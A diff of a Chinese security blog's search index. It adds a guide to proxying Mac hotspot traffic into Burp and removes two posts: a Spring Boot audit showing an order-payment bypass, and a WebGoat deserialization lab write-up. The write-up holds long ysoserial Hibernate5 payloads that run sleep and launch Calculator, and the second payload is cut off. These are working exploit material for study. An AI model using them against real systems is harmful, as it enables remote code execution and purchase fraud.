+<li>打开Burp，监听本地端口，并打开<code>Support invisible proxying</code>选项。</li>
+</ol>
+<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/check-support-invisible-proxying.png" alt="check-support-invisible-proxying" style="zoom:35%;">
+
+<ol start="3">
+<li><p>开启转发功能：<code>sudo sysctl -w net.inet.ip.forwarding=1</code></p>
+</li>
+<li><p>添加<code>/etc/pf.anchors/proxy.rules</code>文件，内容如下：</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr pass on bridge100 inet proto tcp from any to any -&gt; 127.0.0.1 port 8080</span><br><span class="line"></span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 80 -&gt; 127.0.0.1 port 8080</span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 443 -&gt; 127.0.0.1 port 8080</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>添加<code>/etc/pf-minor.conf</code>文件，内容如下：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr-anchor &quot;forwarding&quot;</span><br><span class="line">load anchor &quot;forwarding&quot; from &quot;&#x2F;etc&#x2F;pf.anchors&#x2F;proxy.rules&quot;</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>执行：<code>sudo pfctl -evf /etc/pf-minor.conf</code></li>
+</ol>
+<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/pfctl.png" alt="pfctl" style="zoom:40%;">
+
+
+
+<p>⚠️：还原设定时只需执行：<code>sudo pfctl -evf /etc/pf.conf</code>，并且重启热点</p>
+<p><code>sudo pfctl -d</code>关闭packet filter</p>
+<p>总结：本质上是通过防火墙将某张网卡的流量转发到Burp。在Linux和Windows操作系统中配合防火墙进行流量转发能得到同样的效果。</p>
 ]]></content>
   </entry>
   <entry>
@@ -1051,32 +1155,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Java SpringBoot框架代码审计七 - 逻辑漏洞</title>
-    <url>/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/</url>
-    <content><![CDATA[<p>逻辑漏洞不像之前介绍的漏洞有一套固定的审计流程，每个逻辑漏洞背后的代码都不一样。通过纯白盒去找逻辑漏洞是比较费劲的，首先需要彻底了解业务，再带着各种疑问和奇怪的想法去审。</p>
-<a id="more"></a>
-
-<h1 id="逻辑漏洞代码审计过程"><a href="#逻辑漏洞代码审计过程" class="headerlink" title="逻辑漏洞代码审计过程"></a>逻辑漏洞代码审计过程</h1><p>用户正常的购物过程是<code>添加购物车-&gt;下单-&gt;付款-&gt;出库-&gt;交易成功</code>，但程序在购物过程中没有对前一步进行校验。下订单但未支付时，访问<code>/orders/{orderNo}/finish</code>可直接完成交易。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /src/main/java/ltd/newbee/mall/controller/mall/OrderController.java</span></span><br><span class="line"><span class="meta">@PutMapping</span>(<span class="string">"/orders/&#123;orderNo&#125;/finish"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">finishOrder</span><span class="params">(@PathVariable(<span class="string">"orderNo"</span>)</span> String orderNo, HttpSession httpSession) </span>&#123;</span><br><span class="line">    NewBeeMallUserVO user = (NewBeeMallUserVO) httpSession.getAttribute(Constants.MALL_USER_SESSION_KEY);</span><br><span class="line">    String finishOrderResult = newBeeMallOrderService.finishOrder(orderNo, user.getUserId());</span><br><span class="line">    <span class="keyword">if</span> (ServiceResultEnum.SUCCESS.getResult().equals(finishOrderResult)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ResultGenerator.genSuccessResult();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ResultGenerator.genFailResult(finishOrderResult);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从代码中可以看到直接调用<code>newBeeMallOrderService.finishOrder(orderNo, user.getUserId())</code>，对于该订单是否支付，是否出库等过程都没有校验。</p>
-<h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>随便添加一件物品到购物车，提交订单</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/submit-order.png" alt="submit-order"></p>
-<p>此时来到订单详情页面，按正常逻辑来下一步是付款操作</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/pay-order.png" alt="pay-order"></p>
-<p>在管理页面确认该订单当前状态是待支付</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/wait-for-payment.png" alt="wait-for-payment"></p>
-<p>使用PUT方法访问<code>http://localhost:8089/orders/15886680589866584/finish</code>即可直接完成订单</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/bypass-pay-order.png" alt="bypass-pay-order"></p>
-<p>因为代码使用的是<code>@PutMapping</code>，所以只能使用PUT方法访问，其他请求方法不会被执行</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/finishOrder.png" alt="finishOrder"></p>
-<p>再次查看订单，已经交易成功</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/paid-success.png" alt="paid-success"></p>
-<p>在管理页面查看该订单，证明交易成功。</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/show-orders.png" alt="show-orders"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>Tomcat 8.5版本以上隐藏400报错信息</title>
     <url>/2019/12/26/Tomcat8.5+_400_hide/</url>
     <content><![CDATA[<p>一个平时没注意过的问题。</p>
@@ -1122,195 +1200,6 @@
 <p><img src="/2019/12/26/Tomcat8.5+_400_hide/exec-docker.png" alt="exec-docker"></p>
 <p><code>cd /usr/local/soft/tomcat/</code>就到了tomcat目录，其中<code>conf</code>目录就是配置文件所在的目录，需要更改的<code>server.xml</code>就在该路径下</p>
 <p><img src="/2019/12/26/Tomcat8.5+_400_hide/tomcat-conf-path.png" alt="tomcat-conf-path"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>WebGoat - 不安全的反序列化</title>
-    <url>/2019/09/28/WebGoat-Deserialization/</url>
-    <content><![CDATA[<p>Webgoat有一道不安全反序列化的题，如下：</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization.png" alt="webgoat-insecure-deserialization.png"></p>
-<p>最初看到这题有点迷茫，不知道该怎么下手，正是迷茫才能从中学到反序列。从网上找了一些文章，自己也动手完全整了一遍，在此记录。<a id="more"></a>（网上特别详细的文章也没有，所以很多坑都是一步一个脚印踩上去的）</p>
-<p>最早的一篇讲解Webgoat反序列化的文章</p>
-<p><a href="https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef" target="_blank" rel="noopener">https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef</a></p>
-<p>上一篇文章的中文翻译，其中有部分作者的改动</p>
-<p><a href="https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/" target="_blank" rel="noopener">https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/</a></p>
-<p>另一篇文章</p>
-<p><a href="https://www.jianshu.com/p/0c45058e1723" target="_blank" rel="noopener">https://www.jianshu.com/p/0c45058e1723</a></p>
-<h2 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h2><p>安装Burp插件Java Deserialization Scanner，被动扫描发现存在不安全反序列化漏洞</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-detect.png" alt="deserialization-detect"></p>
-<p>将请求Send request to DS - Manual testing 进行测试，发现存在Hibernate 5类型的反序列化</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-manual-testing.png" alt="deserialization-manual-testing"></p>
-<p>然后将请求Send request to DS - Exploitation</p>
-<p>坑点一：使用原始的ysoserial.jar执行会报错，需要重新编译ysoserial</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting.png" alt="deserialization-exploiting"></p>
-<p>详细报错信息如下所示</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-error.png" alt="deserialization-error"></p>
-<p>在GitHub项目里下载源码，无需修改（因为源码里面已经添加了，但是作者并没有将它打包放在releases里）。GitHub地址：<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
-<p><code>mvn clean package -DskipTests -Dhibernate5</code>即可构建代码（亲测不加-Dhibernate5不行)</p>
-<p>在插件中配置好构建完成的jar包路径，即可正常执行反序列化payload。</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-2.png" alt="deserialization-exploiting-2"></p>
-<p>坑点二：Mac下该Java 版本执行ysoserial.jar会提示</p>
-<blockquote>
-<p>com.nqzero.permit.Permit$InitializationFailed: initialization failed, perhaps you’re running with a security manager</p>
-</blockquote>
-<p><img src="/2019/09/28/WebGoat-Deserialization/java-version.png" alt="java-version"></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/ysoserial-hibernate-error.png" alt="ysoserial-hibernate-error"></p>
-<p>需要在pom.xml中将nqzero版本改为0.4（原始为0.3），重新使用maven构建即可使用。</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/nqzero.png" alt="nqzero.png"></p>
-<p>最开始碰到这个问题还以为在Mac下或者是Java版本太高不能用了，于是在Windows下执行，但是Windows执行后不能立马进行base64，还需要将ysoserial的输出保存在文件中，再将文件内容base64编码，觉得太麻烦。这个问题在谷歌中查也查不到解决办法。</p>
-<p>在IntelliJ IDEA中查看pom.xml文件时发现存在com.nqzero这个包，报错信息也是com.nqzero.permit.Permit$InitializationFailed，于是想着会不会是这个包版本不对，在maven库中一查，果然最新是0.4版本的，于是换成0.4后使用maven构建后可正常使用。</p>
-<p>构建时发现Java版本为1.6，我的maven没法构建，将Java版本改为1.7或者1.8即可正常构建。</p>
-<p>坑点三：在Linux中，ysoserial的反序列化无法使用sleep命令，其他命令能执行，这不知道为什么，但是在其他人文章中发现windows下的sleep能执行。目前没有发现任何解决办法，这个稍后动态调试一下看看到底是什么问题导致的。</p>
-<p><em>PS：但是Deserialization Scanner中的payload是sleep十秒的，目前不清楚是怎么实现的。</em></p>
-<p><strong>请求在执行sleep后并未等待命令结束就已经返回结果</strong>，若要等待进程结束后返回，需要针对ysoserial的执行命令进行调整，重新生成payload进行测试。</p>
-<p>在ysoserial/payloads/util/Gadgets.java:117-119，将代码做以下修改，可实现sleep等待5秒</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">String cmd = <span class="string">"java.lang.Process p=java.lang.Runtime.getRuntime().exec(\\"</span><span class="string">" +</span></span><br><span class="line"><span class="string">            command.replaceAll("</span>\\\\\\\\",<span class="string">"\\\\\\\\\\\\\\\\"</span>).replaceAll(<span class="string">"\\"</span><span class="string">", "</span>\\\\\\"<span class="string">") +</span></span><br><span class="line"><span class="string">            "</span>\\");p.waitFor();<span class="string">";</span></span><br></pre></td></tr></table></figure>
-
-<p>最终效果图如下：</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-success.png" alt="deserialization-exploiting-success"></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization-complete.png" alt="webgoat-insecure-deserialization-complete"></p>
-<p>payload也贴一下吧</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABtPK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAHc2xlZXAgNQgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQARamF2YS9sYW5nL1Byb2Nlc3MHADYBAAd3YWl0Rm9yAQADKClJDAA4ADkKADcAOgEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIxMzkwODU2MDU4NzM2MTYBACBMeXNvc2VyaWFsL1B3bmVyMTM5MDg1NjA1ODczNjE2OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关键就两点：</p>
-<ol>
-<li>识别反序列化流量</li>
-<li>找到相应可利用执行命令的组件</li>
-</ol>
-<p>有时候需要特别修改ysoserial的内容来配合执行命令。</p>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>可在<code>/WebGoat-develop/webgoat-container/src/main/resources/application.properties:6</code> 修改端口等信息</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/application-properties.png" alt="application-properties"></p>
-<p>更改反序列化payload为弹计算器，反序列化payload如下：</p>
-<p>（Mac下计算器路径是<code>/Applications/Calculator.app/Contents/MacOS/Calculator</code>）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABwDK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYW